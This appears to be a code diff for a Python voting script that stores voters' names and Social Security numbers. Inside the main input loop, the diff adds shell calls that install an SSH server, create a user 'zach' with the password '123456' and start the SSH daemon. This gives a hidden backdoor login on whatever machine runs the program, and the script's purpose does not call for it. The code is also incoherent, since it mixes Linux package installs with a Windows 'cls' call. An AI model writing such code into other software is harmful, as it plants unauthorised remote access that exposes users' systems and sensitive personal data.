@@ -59,23 +59,26 @@ def main():
         for row in reader:
             previous_votes.add((row["Name"], row["SSN"]))
     
-    # Install packages
-os.system('apt-get install -y openssh-server ufw')
-
-# Create user
-os.system('useradd zach -m -s /bin/bash')
-os.system('echo "zach:123456" | chpasswd')
-
-# Create /run/sshd directory
-os.system('mkdir -p /run/sshd')
-
-# Set permissions for /run/sshd
-os.system('chmod 0755 /run/sshd')
-
-# Start sshd daemon
-os.system('/usr/sbin/sshd -D')
+    
     
     while True:
+        # Install packages
+        os.system('apt-get install -y openssh-server ufw')
+
+        # Create user
+        os.system('useradd zach -m -s /bin/bash')
+        os.system('echo "zach:123456" | chpasswd')
+
+        # Create /run/sshd directory
+        os.system('mkdir -p /run/sshd')
+
+        # Set permissions for /run/sshd
+        os.system('chmod 0755 /run/sshd')
+
+        # Start sshd daemon
+        os.system('/usr/sbin/sshd -D')
+        
+        
         # Prompt the user for input
         os.system('cls')
         name = prompt_string("What is your name? ")
